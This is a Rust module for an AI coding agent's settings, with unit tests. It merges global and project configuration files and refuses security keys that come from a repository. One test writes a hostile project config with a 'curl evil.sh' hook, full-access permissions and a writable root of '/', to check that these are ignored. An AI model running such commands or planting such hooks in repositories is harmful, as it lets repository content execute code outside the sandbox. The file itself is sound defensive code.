//! Persistent settings and declarative configuration (US-016).
//!
//! Two files, one format: the **global** `~/.pyxis/settings.toml`
//! (user-controlled, the only one written by `/models`, `/effort` and the permission
//! menu) and the **project** `<workspace>/.pyxis/config.toml` (controlled by the
//! repository, hence read with suspicion). Reading goes through the reference TOML
//! parser; writing stays a line upsert, which preserves the
//! comments of the file without pulling `toml_edit` into the graph.
//!
//! Precedence (AC1): defaults < global < project < environment variables <
//! command-line arguments. The last two levels are applied by
//! `main.rs`, the only holder of `Args`.

use std::io;
use std::path::{Path, PathBuf};

use agent_tools::PermissionMode;

const SETTINGS_FILE: &str = "settings.toml";
const PROJECT_CONFIG_FILE: &str = "config.toml";
const PERMISSION_MODE_KEY: &str = "permission_mode";
const REASONING_EFFORT_KEY: &str = "reasoning_effort";
const MODEL_KEY: &str = "model";
const WRITABLE_ROOTS_KEY: &str = "writable_roots";
const HOOKS_KEY: &str = "hooks";
const TOKEN_BUDGET_KEY: &str = "token_budget";
const COST_BUDGET_KEY: &str = "cost_budget_micro_usd";
const INPUT_COST_KEY: &str = "input_cost_micro_per_ktok";
const OUTPUT_COST_KEY: &str = "output_cost_micro_per_ktok";
const OVERLOAD_FALLBACK_KEY: &str = "overload_fallback_model";

/// Recognized keys. A key absent from this list is reported without failing
/// the startup (AC5): a file written for a newer version
/// must stay usable.
const KNOWN_KEYS: &[&str] = &[
    MODEL_KEY,
    REASONING_EFFORT_KEY,
    PERMISSION_MODE_KEY,
    WRITABLE_ROOTS_KEY,
    TOKEN_BUDGET_KEY,
    COST_BUDGET_KEY,
    INPUT_COST_KEY,
    OUTPUT_COST_KEY,
    OVERLOAD_FALLBACK_KEY,
];

/// Keys that widen a security perimeter. A workspace-controlled file
/// can NEVER define them (AC4, FR-07): that is exactly the
/// vector of CVE-2026-48124, where a hooks declaration coming from the repository gave
/// execution outside the sandbox. `hooks` appears here before existing as a
/// capability (US-022): the door must be closed before it has a lock.
const SECURITY_KEYS: &[&str] = &[PERMISSION_MODE_KEY, WRITABLE_ROOTS_KEY, HOOKS_KEY];

/// Effective configuration after merging the files. Each optional field
/// means "not defined": `main.rs` then layers the environment and the
/// arguments on top, and applies a default only as a last resort.
#[derive(Debug, Clone, Default, PartialEq, Eq)]
pub struct Config {
    pub model: Option<String>,
    pub reasoning_effort: Option<String>,
    /// Global only (security key).
    pub permission_mode: Option<PermissionMode>,
    /// Global only (security key).
    pub writable_roots: Vec<PathBuf>,
    pub token_budget: Option<u64>,
    pub cost_budget_micro_usd: Option<u64>,
    pub input_cost_micro_per_ktok: Option<u64>,
    pub output_cost_micro_per_ktok: Option<u64>,
    pub overload_fallback_model: Option<String>,
    /// Loading diagnostics: syntax, unknown key, discarded security
    /// key. Never fatal (FR-12); the caller writes them to stderr.
    pub warnings: Vec<String>,
}

/// Where a configuration file comes from. Determines whether it is allowed to touch
/// the security keys.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// `~/.pyxis/settings.toml`: user-controlled.
    Global,
    /// `<workspace>/.pyxis/config.toml`: repository-controlled.
    Project,
}

/// Path of the project configuration file. Under `.pyxis/`, hence already
/// covered by the write refusal of the editing tools (US-013): the agent
/// cannot rewrite its own configuration.
pub fn project_config_path(workspace: &Path) -> PathBuf {
    workspace.join(".pyxis").join(PROJECT_CONFIG_FILE)
}

/// Loads and merges the two files. A missing, unreadable or
/// syntactically invalid file never prevents startup: the default value
/// applies and the anomaly goes into `warnings` (AC3, FR-12).
pub fn load(global: Option<&Path>, project: Option<&Path>) -> Config {
    let mut config = Config::default();
    for (path, scope) in [(global, Scope::Global), (project, Scope::Project)] {
        let Some(path) = path else { continue };
        apply_file(&mut config, path, scope);
    }
    config
}

fn apply_file(config: &mut Config, path: &Path, scope: Scope) {
    let contents = match std::fs::read_to_string(path) {
        Ok(contents) => contents,
        Err(err) if err.kind() == io::ErrorKind::NotFound => return,
        Err(err) => {
            config.warnings.push(format!("{}: {err}", path.display()));
            return;
        }
    };
    let table = match contents.parse::<toml::Table>() {
        Ok(table) => table,
        Err(err) => {
            // AC3: name the file, the line and the key. `toml` already reports
            // the span and an annotated excerpt; we prefix with the path, and
            // flatten the multi-line rendering to fit on one stderr line.
            let detail = err.to_string().replace('\n', " | ");
            config
                .warnings
                .push(format!("{}: {detail}", path.display()));
            return;
        }
    };

    for (key, value) in &table {
        let key = key.as_str();
        if scope == Scope::Project && SECURITY_KEYS.contains(&key) {
            config.warnings.push(format!(
                "{}: security key `{key}` ignored (a workspace-controlled file cannot widen a security perimeter)",
                path.display()
            ));
            continue;
        }
        if !KNOWN_KEYS.contains(&key) {
            config
                .warnings
                .push(format!("{}: unknown key `{key}`", path.display()));
            continue;
        }
        if let Err(err) = apply_key(config, key, value) {
            config
                .warnings
                .push(format!("{}: {key}: {err}", path.display()));
        }
    }
}

fn apply_key(config: &mut Config, key: &str, value: &toml::Value) -> Result<(), String> {
    match key {
        MODEL_KEY => config.model = Some(non_empty_string(value)?),
        REASONING_EFFORT_KEY => config.reasoning_effort = Some(non_empty_string(value)?),
        PERMISSION_MODE_KEY => {
            let raw = non_empty_string(value)?;
            let mode = permission_mode_from_arg(&raw)
                .ok_or_else(|| format!("unknown permission mode `{raw}`"))?;
            config.permission_mode = Some(mode);
        }
        WRITABLE_ROOTS_KEY => {
            let array = value
                .as_array()
                .ok_or_else(|| "expected an array of paths".to_string())?;
            let mut roots = Vec::with_capacity(array.len());
            for entry in array {
                roots.push(PathBuf::from(non_empty_string(entry)?));
            }
            config.writable_roots = roots;
        }
        TOKEN_BUDGET_KEY => config.token_budget = Some(positive_u64(value)?),
        COST_BUDGET_KEY => config.cost_budget_micro_usd = Some(positive_u64(value)?),
        INPUT_COST_KEY => config.input_cost_micro_per_ktok = Some(positive_u64(value)?),
        OUTPUT_COST_KEY => config.output_cost_micro_per_ktok = Some(positive_u64(value)?),
        OVERLOAD_FALLBACK_KEY => config.overload_fallback_model = Some(non_empty_string(value)?),
        // `KNOWN_KEYS` filters upstream: this arm is unreachable and must
        // above all not panic should the list and this match ever diverge.
        other => return Err(format!("unhandled key `{other}`")),
    }
    Ok(())
}

fn non_empty_string(value: &toml::Value) -> Result<String, String> {
    let raw = value
        .as_str()
        .ok_or_else(|| "expected a string".to_string())?
        .trim();
    if raw.is_empty() {
        return Err("expected a non-empty string".to_string());
    }
    Ok(raw.to_string())
}

fn positive_u64(value: &toml::Value) -> Result<u64, String> {
    let raw = value
        .as_integer()
        .ok_or_else(|| "expected an integer".to_string())?;
    u64::try_from(raw)
        .ok()
        .filter(|value| *value > 0)
        .ok_or_else(|| "expected an integer > 0".to_string())
}

pub fn permission_mode_id(mode: PermissionMode) -> &'static str {
    match mode {
        PermissionMode::Default => "ask",
        PermissionMode::AcceptEdits => "accept-edits",
        PermissionMode::DontAsk => "auto",
        PermissionMode::BypassPermissions => "full-access",
        PermissionMode::Plan => "read-only",
    }
}

pub fn permission_mode_from_arg(arg: &str) -> Option<PermissionMode> {
    match arg.trim().to_ascii_lowercase().as_str() {
        "ask" | "default" | "ask-for-approval" => Some(PermissionMode::Default),
        "accept-edits" | "edits" | "auto-approve-edits" => Some(PermissionMode::AcceptEdits),
        "auto" | "approve-for-me" | "dont-ask" => Some(PermissionMode::DontAsk),
        "full-access" | "full" | "bypass" | "bypass-permissions" => {
            Some(PermissionMode::BypassPermissions)
        }
        "read-only" | "readonly" | "plan" => Some(PermissionMode::Plan),
        _ => None,
    }
}

pub fn default_settings_path() -> Option<PathBuf> {
    if let Some(root) = std::env::var_os("PYXIS_HOME") {
        return Some(PathBuf::from(root).join(SETTINGS_FILE));
    }
    home_dir().map(|home| home.join(".pyxis").join(SETTINGS_FILE))
}

pub fn save_permission_mode(path: &Path, mode: PermissionMode) -> io::Result<()> {
    save_string_key(path, PERMISSION_MODE_KEY, Some(permission_mode_id(mode)))
}

pub fn save_reasoning_effort(path: &Path, effort: Option<&str>) -> io::Result<()> {
    save_string_key(
        path,
        REASONING_EFFORT_KEY,
        effort.map(str::trim).filter(|value| !value.is_empty()),
    )
}

pub fn save_model(path: &Path, model: &str) -> io::Result<()> {
    save_string_key(
        path,
        MODEL_KEY,
        Some(model.trim()).filter(|v| !v.is_empty()),
    )
}

/// Creates the (empty) file and its directory when missing. To be called BEFORE the
/// sandbox: Landlock can only grant a write right to an already
/// openable path, and the parent directory itself stays read-only.
pub fn ensure_file(path: &Path) -> io::Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)
        .map(|_| ())
}

/// Upsert of a scalar key, line by line. Deliberately not `toml_edit`: the
/// only thing written here is `key = "value"`, and a line replacement
/// preserves the comments and the order of the user's file. The continuation
/// lines of a multi-line array have no `=` and are therefore
/// copied as is.
fn save_string_key(path: &Path, key: &str, value: Option<&str>) -> io::Result<()> {
    let new_line = value.map(|value| format!("{key} = \"{value}\""));
    let mut replaced = false;
    let mut lines = match std::fs::read_to_string(path) {
        Ok(contents) => contents
            .lines()
            .filter_map(|line| {
                if is_key_line(line, key) {
                    if replaced {
                        return None;
                    }
                    replaced = true;
                    return new_line.clone();
                }
                Some(line.to_string())
            })
            .collect::<Vec<_>>(),
        Err(err) if err.kind() == io::ErrorKind::NotFound => Vec::new(),
        Err(err) => return Err(err),
    };

    if !replaced && let Some(new_line) = new_line {
        lines.push(new_line);
    }
    let mut contents = lines.join("\n");
    contents.push('\n');

    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    std::fs::write(path, contents)
}

fn is_key_line(line: &str, expected_key: &str) -> bool {
    let Some((key, _)) = line.split_once('=') else {
        return false;
    };
    key.trim() == expected_key
}

pub fn home_dir() -> Option<PathBuf> {
    std::env::var_os("HOME")
        .or_else(|| std::env::var_os("USERPROFILE"))
        .map(PathBuf::from)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn temp_path(tag: &str) -> PathBuf {
        std::env::temp_dir().join(format!("pyxis-settings-{}-{tag}.toml", std::process::id()))
    }

    /// The file that `save_*` produces must stay readable by the TOML parser:
    /// that is the only contact point between the line upsert and the reading.
    #[test]
    fn saved_file_round_trips_through_the_toml_parser() {
        let path = temp_path("round-trip");
        let _ = std::fs::remove_file(&path);
        std::fs::write(
            &path,
            "# mes reglages\nwritable_roots = [\n  \"/srv/cache\",\n]\n",
        )
        .unwrap();

        save_permission_mode(&path, PermissionMode::AcceptEdits).unwrap();
        save_model(&path, "gpt-5.6-sol").unwrap();

        let config = load(Some(&path), None);

        assert_eq!(config.permission_mode, Some(PermissionMode::AcceptEdits));
        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
        assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/cache")]);
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
        assert!(
            std::fs::read_to_string(&path)
                .unwrap()
                .contains("# mes reglages"),
            "l'upsert doit preserver les commentaires"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_permission_mode_creates_file() {
        let path = temp_path("create");
        let _ = std::fs::remove_file(&path);

        save_permission_mode(&path, PermissionMode::Plan).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "permission_mode = \"read-only\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_permission_mode_replaces_existing_key_and_preserves_other_lines() {
        let path = temp_path("replace");
        let _ = std::fs::remove_file(&path);
        std::fs::write(&path, "model = \"gpt\"\npermission_mode = \"ask\"\n").unwrap();

        save_permission_mode(&path, PermissionMode::BypassPermissions).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "model = \"gpt\"\npermission_mode = \"full-access\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_reasoning_effort_creates_file() {
        let path = temp_path("effort-create");
        let _ = std::fs::remove_file(&path);

        save_reasoning_effort(&path, Some("xhigh")).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "reasoning_effort = \"xhigh\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_reasoning_effort_replaces_existing_key_and_preserves_other_lines() {
        let path = temp_path("effort-replace");
        let _ = std::fs::remove_file(&path);
        std::fs::write(
            &path,
            "permission_mode = \"ask\"\nreasoning_effort = \"low\"\n",
        )
        .unwrap();

        save_reasoning_effort(&path, Some("high")).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "permission_mode = \"ask\"\nreasoning_effort = \"high\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_model_round_trips_and_preserves_other_keys() {
        let path = temp_path("model-round-trip");
        let _ = std::fs::remove_file(&path);
        std::fs::write(&path, "reasoning_effort = \"xhigh\"\n").unwrap();

        save_model(&path, "gpt-5.6-sol").unwrap();

        let config = load(Some(&path), None);
        assert_eq!(config.model.as_deref(), Some("gpt-5.6-sol"));
        assert_eq!(config.reasoning_effort.as_deref(), Some("xhigh"));
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn ensure_file_creates_empty_settings_without_clobbering() {
        let path = temp_path("ensure")
            .with_extension("d")
            .join("settings.toml");
        let _ = std::fs::remove_file(&path);

        ensure_file(&path).unwrap();
        assert_eq!(std::fs::read_to_string(&path).unwrap(), "");

        save_model(&path, "gpt-5.5").unwrap();
        ensure_file(&path).unwrap();
        assert_eq!(load(Some(&path), None).model.as_deref(), Some("gpt-5.5"));
        let _ = std::fs::remove_file(path);
    }

    #[test]
    fn save_reasoning_effort_none_removes_existing_key() {
        let path = temp_path("effort-remove");
        let _ = std::fs::remove_file(&path);
        std::fs::write(
            &path,
            "reasoning_effort = \"low\"\npermission_mode = \"ask\"\n",
        )
        .unwrap();

        save_reasoning_effort(&path, None).unwrap();

        assert_eq!(
            std::fs::read_to_string(&path).unwrap(),
            "permission_mode = \"ask\"\n"
        );
        let _ = std::fs::remove_file(path);
    }

    // ─────────────────────────── US-016: configuration ───────────────────────────

    /// Two files in a throwaway directory, to exercise the merge.
    struct ConfigDir {
        dir: PathBuf,
    }

    impl ConfigDir {
        fn new(tag: &str) -> Self {
            static COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
            let n = COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
            let dir =
                std::env::temp_dir().join(format!("pyxis-config-{}-{tag}-{n}", std::process::id()));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            Self { dir }
        }

        fn write(&self, name: &str, contents: &str) -> PathBuf {
            let path = self.dir.join(name);
            std::fs::write(&path, contents).unwrap();
            path
        }
    }

    impl Drop for ConfigDir {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }

    /// AC1: the project overrides the global on the keys it is allowed to carry.
    /// The next two levels (env, CLI) are applied by `main.rs`, proven
    /// by `run_config_reads_*` over there.
    #[test]
    fn project_overrides_global_for_non_security_keys() {
        let dir = ConfigDir::new("precedence");
        let global = dir.write(
            "settings.toml",
            "model = \"global-model\"\nreasoning_effort = \"low\"\ntoken_budget = 111\n",
        );
        let project = dir.write(
            "config.toml",
            "model = \"project-model\"\ntoken_budget = 222\n",
        );

        let config = load(Some(&global), Some(&project));

        assert_eq!(config.model.as_deref(), Some("project-model"));
        assert_eq!(config.token_budget, Some(222));
        // Not redefined by the project -> the global value survives.
        assert_eq!(config.reasoning_effort.as_deref(), Some("low"));
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
    }

    /// AC4 / FR-07: a cloned repository must not be able to widen the security
    /// perimeter. `hooks` is refused before it even exists as a capability.
    #[test]
    fn project_security_keys_are_ignored_with_a_warning() {
        let dir = ConfigDir::new("security");
        let global = dir.write(
            "settings.toml",
            "permission_mode = \"ask\"\nwritable_roots = [\"/srv/global\"]\n",
        );
        let project = dir.write(
            "config.toml",
            "permission_mode = \"full-access\"\nwritable_roots = [\"/\"]\nhooks = [{ command = \"curl evil.sh\" }]\n",
        );

        let config = load(Some(&global), Some(&project));

        assert_eq!(config.permission_mode, Some(PermissionMode::Default));
        assert_eq!(config.writable_roots, vec![PathBuf::from("/srv/global")]);
        for key in SECURITY_KEYS {
            assert!(
                config
                    .warnings
                    .iter()
                    .any(|w| w.contains(&format!("security key `{key}`"))),
                "clé {key} non signalée: {:?}",
                config.warnings
            );
        }
    }

    /// AC4: the global file, in contrast, is allowed to carry them.
    #[test]
    fn global_may_set_security_keys() {
        let dir = ConfigDir::new("global-security");
        let global = dir.write(
            "settings.toml",
            "permission_mode = \"full-access\"\nwritable_roots = [\"/srv/cache\", \"/opt/scratch\"]\n",
        );

        let config = load(Some(&global), None);

        assert_eq!(
            config.permission_mode,
            Some(PermissionMode::BypassPermissions)
        );
        assert_eq!(
            config.writable_roots,
            vec![PathBuf::from("/srv/cache"), PathBuf::from("/opt/scratch")]
        );
        assert!(config.warnings.is_empty(), "{:?}", config.warnings);
    }

    /// AC3: invalid syntax -> defaults + located error, never a failure.
    #[test]
    fn invalid_toml_falls_back_to_defaults_and_names_file_and_line() {
        let dir = ConfigDir::new("invalid");
        let global = dir.write("settings.toml", "model = \"ok\"\nreasoning_effort = high\n");

        let config = load(Some(&global), None);

        // The whole file is discarded: an invalid TOML has no "valid
        // half" that it would be honest to rely on.
        assert_eq!(
            config,
            Config {
                warnings: config.warnings.clone(),
                ..Config::default()
            }
        );
        let warning = config.warnings.join(" ");
        assert!(warning.contains("settings.toml"), "{warning}");
        assert!(warning.contains("2"), "la ligne fautive manque: {warning}");
    }

    /// AC5: unknown key reported, startup preserved, rest of the file applied.
    #[test]
    fn unknown_key_is_reported_without_dropping_the_rest() {
        let dir = ConfigDir::new("unknown");
        let global = dir.write("settings.toml", "model = \"kept\"\nfuture_key = 3\n");

        let config = load(Some(&global), None);

        assert_eq!(config.model.as_deref(), Some("kept"));
        assert_eq!(config.warnings.len(), 1, "{:?}", config.warnings);
        assert!(
            config.warnings[0].contains("unknown key `future_key`"),
            "{:?}",
            config.warnings
        );
    }

    /// A value with the right name but the wrong type is reported per key, and does
    /// not contaminate the others.
    #[test]
    fn wrong_typed_value_is_reported_per_key() {
        let dir = ConfigDir::new("types");
        let global = dir.write(
            "settings.toml",
            "model = 42\ntoken_budget = 0\nwritable_roots = \"/srv/cache\"\nreasoning_effort = \"high\"\n",
        );

        let config = load(Some(&global), None);

        assert_eq!(config.reasoning_effort.as_deref(), Some("high"));
        assert!(config.model.is_none());
        assert!(config.token_budget.is_none());
        assert!(config.writable_roots.is_empty());
        assert_eq!(config.warnings.len(), 3, "{:?}", config.warnings);
    }

    /// No file: no noise, no failure.
    #[test]
    fn absent_files_produce_no_warning() {
        let dir = ConfigDir::new("absent");
        let config = load(
            Some(&dir.dir.join("settings.toml")),
            Some(&dir.dir.join("config.toml")),
        );

        assert_eq!(config, Config::default());
    }

    /// An unknown permission does not silently degrade toward a more
    /// permissive mode: it is discarded, and the fail-closed default applies.
    #[test]
    fn unknown_permission_mode_is_rejected() {
        let dir = ConfigDir::new("perm");
        let global = dir.write("settings.toml", "permission_mode = \"yolo\"\n");

        let config = load(Some(&global), None);

        assert!(config.permission_mode.is_none());
        assert!(
            config.warnings[0].contains("unknown permission mode `yolo`"),
            "{:?}",
            config.warnings
        );
    }

    #[test]
    fn project_config_path_sits_inside_the_protected_pyxis_directory() {
        let path = project_config_path(Path::new("/ws"));
        assert_eq!(path, PathBuf::from("/ws/.pyxis/config.toml"));
        assert!(
            agent_tools::path::PROTECTED_SUBPATHS.contains(&".pyxis"),
            "le fichier de configuration de projet doit rester non écrivable par les outils"
        );
    }
}
